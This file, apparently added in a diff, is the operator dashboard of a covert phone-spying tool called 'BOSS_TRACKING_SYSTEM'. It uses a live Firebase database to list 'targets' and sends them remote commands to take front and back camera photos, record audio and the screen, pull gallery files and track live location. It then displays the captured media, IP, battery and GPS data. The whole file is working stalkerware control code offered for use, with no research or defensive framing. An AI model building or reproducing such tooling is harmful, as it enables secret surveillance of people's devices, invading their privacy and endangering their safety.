@@ -1,0 +1,239 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>BOSS_TRACKING_SYSTEM | V7</title>
+    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
+    <style>
+        :root { --neon: #00ff41; --bg: #050505; --panel: #111; --border: #222; --red: #ff3131; }
+        body { background: var(--bg); color: var(--neon); font-family: monospace; margin: 0; display: flex; height: 100vh; }
+        
+        .sidebar { width: 320px; border-right: 1px solid var(--border); padding: 15px; overflow-y: auto; }
+        .target-card { border: 1px solid var(--border); padding: 10px; margin-bottom: 10px; cursor: pointer; position: relative; }
+        .target-card.active { border-left: 5px solid var(--neon); background: rgba(0,255,65,0.1); }
+        
+        .status-online { font-size: 10px; color: var(--neon); position: absolute; right: 10px; top: 10px; font-weight: bold; }
+        .target-name { color: #fff; font-weight: bold; display: block; margin-bottom: 5px; }
+
+        .main { flex: 1; padding: 20px; overflow-y: auto; }
+        .control-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(140px, 1fr)); gap: 10px; margin-bottom: 20px; }
+        .btn { background: #000; border: 1px solid var(--neon); color: var(--neon); padding: 10px; cursor: pointer; font-size: 11px; text-transform: uppercase; }
+        .btn:hover { background: var(--neon); color: #000; }
+        .btn-red { border-color: var(--red); color: var(--red); }
+
+        .grid { display: grid; grid-template-columns: 1fr 1fr; gap: 20px; }
+        .box { background: var(--panel); border: 1px solid var(--border); padding: 15px; border-radius: 5px; position: relative; }
+        
+        .gallery { display: grid; grid-template-columns: repeat(auto-fill, minmax(120px, 1fr)); gap: 15px; }
+        .item-container { position: relative; border: 1px solid #333; padding: 2px; }
+        .gallery img, .gallery video { width: 100%; display: block; } /* Video support */
+        .delete-btn { position: absolute; top: -5px; right: -5px; background: var(--red); color: white; border: none; border-radius: 50%; width: 20px; height: 20px; cursor: pointer; font-weight: bold; font-size: 12px; z-index: 10; display: flex; align-items: center; justify-content: center; box-shadow: 0 0 5px #000; }
+        
+        .audio-item, .video-item, .gallery-item { margin-bottom: 10px; display: flex; align-items: center; gap: 10px; background: #000; padding: 5px; position: relative; }
+        input[type="text"] { background: #000; border: 1px solid #333; color: #fff; padding: 5px; width: 80%; margin-top: 5px; }
+    </style>
+</head>
+<body>
+
+<div class="sidebar">
+    <h3>BOSS TRACKING SYSTEM</h3>
+    <div id="target-list">Connecting...</div>
+</div>
+
+<div class="main">
+    <div id="header-area" style="display:flex; justify-content: space-between; align-items: center;">
+        <h1 id="display-id">SELECT_TARGET</h1>
+        <div id="name-editor" style="display:none;">
+            <input type="text" id="target-alias" placeholder="Set Target Name...">
+            <button onclick="saveName()" class="btn" style="padding:5px;">SAVE NAME</button>
+        </div>
+    </div>
+
+    <div id="controls" style="display:none;">
+        <div class="control-grid">
+            <button class="btn" onclick="sendCmd('photo')">Front Photo</button>
+            <button class="btn" onclick="sendCmd('back_photo')">Back Camera</button>
+            <button class="btn" onclick="sendCmd('audio')">Audio Record</button>
+            <button class="btn" onclick="trackLive()">Live Location</button>
+            <button class="btn" onclick="sendCmd('screen_record')">Screen Record</button> <button class="btn" onclick="sendCmd('gallery_access')">Gallery Access</button> <button class="btn" onclick="showDetails()">User Details</button>
+            <button class="btn" onclick="location.reload()">Refresh</button>
+            <button class="btn btn-red" onclick="deleteTarget()">Delete User Data</button>
+        </div>
+    </div>
+
+    <div class="grid">
+        <div class="box">
+            <h3>LOGS / DETAILS</h3>
+            <div id="info-box">...</div>
+        </div>
+        <div class="box">
+            <h3>MAP_TRACKER</h3>
+            <div id="map-box" style="height:150px; display:flex; align-items:center; justify-content:center; border:1px dashed #333;">
+                Waiting for GPS...
+            </div>
+        </div>
+        <div class="box">
+            <h3>AUDIO_INTERCEPT</h3>
+            <div id="audio-box"></div>
+        </div>
+        <div class="box">
+            <h3>VISUAL_DATA</h3>
+            <div id="photo-box" class="gallery"></div>
+        </div>
+        <div class="box" style="grid-column: span 2;"> <h3>RECORDED_CONTENT</h3>
+            <div id="recorded-content-box" class="gallery">
+                <p style="color:#aaa;">Screen Recordings & Gallery Files will appear here.</p>
+            </div>
+        </div>
+    </div>
+</div>
+
+<script>
+    const firebaseConfig = { databaseURL: "https://mytrecker2-b3535-default-rtdb.firebaseio.com/" };
+    firebase.initializeApp(firebaseConfig);
+    const db = firebase.database();
+    let currentTid = null;
+    let gps = null;
+
+    // 1. Sidebar Logic (Only show 'online' if active)
+    db.ref('targets').on('value', snap => {
+        const list = document.getElementById('target-list');
+        list.innerHTML = "";
+        snap.forEach(c => {
+            const tid = c.key;
+            const data = c.val();
+            const name = data.alias || tid;
+            const isOnline = data.info && data.info.status === "ONLINE";
+            
+            list.innerHTML += `
+                <div class="target-card ${currentTid === tid ? 'active' : ''}" onclick="selectTarget('${tid}')">
+                    <span class="target-name">${name}</span>
+                    <small style="font-size:9px;">${tid}</small>
+                    ${isOnline ? '<span class="status-online">online</span>' : ''}
+                </div>`;
+        });
+    });
+
+    function selectTarget(tid) {
+        currentTid = tid;
+        document.getElementById('display-id').innerText = tid;
+        document.getElementById('controls').style.display = 'block';
+        document.getElementById('name-editor').style.display = 'block';
+        
+        // Load System Info
+        db.ref(`targets/${tid}/info`).on('value', s => {
+            const d = s.val() || {};
+            document.getElementById('info-box').innerHTML = `IP: ${d.ip || '---'}<br>Batt: ${d.battery || '---'}<br>Device: ${d.device || '---'}<br>Last PING: <span style="color:var(--red)">${d.time || '---'}</span>`;
+        });
+
+        // Load Photos with Delete X
+        db.ref(`targets/${tid}/photos`).on('value', s => {
+            const b = document.getElementById('photo-box'); b.innerHTML = "";
+            s.forEach(p => {
+                const imgID = p.key;
+                const imgData = p.val().img;
+                b.innerHTML += `
+                    <div class="item-container">
+                        <button class="delete-btn" onclick="deleteItem('photos', '${imgID}')">X</button>
+                        <img src="${imgData}" onclick="window.open(this.src)">
+                    </div>`;
+            });
+        });
+
+        // Load Audios with Delete X
+        db.ref(`targets/${tid}/audios`).on('value', s => {
+            const b = document.getElementById('audio-box'); b.innerHTML = "";
+            s.forEach(a => {
+                const audID = a.key;
+                const audSrc = a.val().audio;
+                b.innerHTML += `
+                    <div class="audio-item">
+                        <button class="delete-btn" style="position:relative; top:0; right:0;" onclick="deleteItem('audios', '${audID}')">X</button>
+                        <audio controls src="${audSrc}" style="width:150px; height:30px;"></audio>
+                    </div>`;
+            });
+        });
+
+        // Load Screen Records & Gallery Files
+        db.ref(`targets/${tid}/screen_records`).on('value', s => {
+            const box = document.getElementById('recorded-content-box');
+            box.innerHTML = ""; // Clear existing content
+            s.forEach(rec => {
+                const recID = rec.key;
+                const recData = rec.val();
+                box.innerHTML += `
+                    <div class="item-container video-item">
+                        <button class="delete-btn" onclick="deleteItem('screen_records', '${recID}')">X</button>
+                        <video controls src="${recData.video}" style="width:100px; height:80px;"></video>
+                        <p style="font-size:9px; color:#ccc;">Screen Rec (${new Date(recData.time).toLocaleTimeString()})</p>
+                    </div>`;
+            });
+        });
+
+        db.ref(`targets/${tid}/gallery_files`).on('value', s => {
+            const box = document.getElementById('recorded-content-box');
+            s.forEach(file => { // Append to existing content
+                const fileID = file.key;
+                const fileData = file.val();
+                if (fileData.type.startsWith('image/')) {
+                    box.innerHTML += `
+                        <div class="item-container gallery-item">
+                            <button class="delete-btn" onclick="deleteItem('gallery_files', '${fileID}')">X</button>
+                            <img src="${fileData.data}" onclick="window.open(this.src)">
+                            <p style="font-size:9px; color:#ccc;">${fileData.name} (${new Date(fileData.time).toLocaleTimeString()})</p>
+                        </div>`;
+                }
+            });
+             if (box.innerHTML === "") { // Agar koi content nahi to default message dikhao
+                box.innerHTML = `<p style="color:#aaa;">Screen Recordings & Gallery Files will appear here.</p>`;
+            }
+        });
+
+
+        // Map Fix
+        db.ref(`targets/${tid}/location`).on('value', s => {
+            gps = s.val();
+            if(gps && gps.lat) {
+                document.getElementById('map-box').innerHTML = `<button class="btn" onclick="window.open('https://www.google.com/maps?q=${gps.lat},${gps.lng}')">TRACK ON MAP</button>`;
+            } else if (gps && gps.note === "DENIED") {
+                document.getElementById('map-box').innerHTML = `<p style="color:${'--red'}; font-size:12px;">GPS DENIED!</p>`;
+            } else {
+                document.getElementById('map-box').innerHTML = `<p style="color:#aaa;">Waiting for GPS...</p>`;
+            }
+        });
+    }
+
+    // Command System
+    function sendCmd(act) { db.ref(`commands/${currentTid}`).set({ action: act, t: Date.now() }); }
+    
+    // Single Item Delete (X button logic)
+    function deleteItem(type, id) {
+        if(confirm("Delete this " + type + "?")) {
+            db.ref(`targets/${currentTid}/${type}/${id}`).remove();
+        }
+    }
+
+    function saveName() {
+        const name = document.getElementById('target-alias').value;
+        if(name) db.ref(`targets/${currentTid}/alias`).set(name);
+    }
+
+    function trackLive() {
+        if(gps && gps.lat) window.open(`https://www.google.com/maps?q=${gps.lat},${gps.lng}`);
+        else alert("No GPS signal yet!");
+    }
+
+    function showDetails() {
+        alert("Target Details:\n" + document.getElementById('info-box').innerText.replace(/<br>/g, '\n'));
+    }
+
+    function deleteTarget() {
+        if(confirm("DANGER: Permanently wipe all data for this user?")) {
+            db.ref(`targets/${currentTid}`).remove();
+            location.reload();
+        }
+    }
+</script>
+</body>
+</html>
